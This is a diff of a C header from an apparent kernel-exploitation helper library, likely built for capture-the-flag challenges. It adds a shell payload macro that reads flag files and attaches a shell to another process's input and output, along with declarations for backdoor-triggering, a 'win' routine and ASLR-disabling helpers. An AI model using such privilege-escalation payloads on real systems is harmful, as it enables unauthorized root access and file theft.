@@ -3,25 +3,21 @@
 
 #include <kpwn/logger.h>
 #include <stddef.h>
-#include <stdio.h>
 
-struct cpu_state {
-  size_t cs;
-  size_t ss;
-  size_t rsp;
-  size_t rflags;
-};
+#define LPE_BILLY                  \
+  "#!/bin/sh\nPID=`pidof billy`\n" \
+  "/bin/cat /flag* /root/flag*\n"  \
+  "/bin/sh >/proc/$PID/fd/1 </proc/$PID/fd/0 2>&1"
 
-struct cpu_state cpu_now();
-
-void noaslr();
-
-void print_cpu_state(logf_t log,
-                     const struct cpu_state* state);
+void noaslr(int argc, char *argv[]);
 
 __attribute__((naked, noreturn)) void win();
 
 void process_assign_to_core(int core_id);
 void thread_assign_to_core(int core_id);
+
+void trigger_corewin(const char *backdoor_file,
+                     const char *backdoor_cmd);
+void init_billy(char **argv);
 
 #endif
